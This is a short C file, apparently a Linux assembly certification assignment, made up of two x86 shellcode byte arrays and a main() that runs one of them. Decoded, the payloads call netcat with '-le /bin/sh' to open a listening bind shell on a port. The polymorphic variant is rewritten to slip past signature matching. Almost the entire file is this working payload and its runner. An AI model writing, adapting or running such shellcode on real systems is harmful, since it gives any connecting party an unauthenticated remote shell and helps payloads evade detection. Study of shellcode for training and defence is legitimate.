#include<stdio.h>
#include<string.h>
//Author: Aaron Weathersby
//SLAE #1488
//Handle: t0b0x0r
//github:https://github.com/t0b0rX0r/slae/upload/master/assignment6_task1
//;Assignment #5- Polymorphic Conversion- NetCat Call
//created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

#include<stdio.h>
#include<string.h>

unsigned char code[] = 
"\x31\xc0\x89\xc2\x52\x05\x36\x36\x36\x30\x05\x01\x01\x01\x01\x50\x31\xc0\x05\x01\x01\x01\x01\x05\x2c\x75\x6f\x30\x50\x31\xc0\x89\xe6\x50\x05\x01\x01\x01\x01\x05\x2e\x2e\x72\x67\x50\x31\xc0\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\x04\x0b\xcd\x80";


unsigned char org[] =
"\x31\xc0\x31\xd2\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80";



main()
{

	printf("Polymorphic Shellcode Length:  %d\n", strlen(code));
	printf("Orginal Shellcode Length:  %d\n", strlen(org));

	int (*ret)() = (int(*)())code;

	ret();

}

	
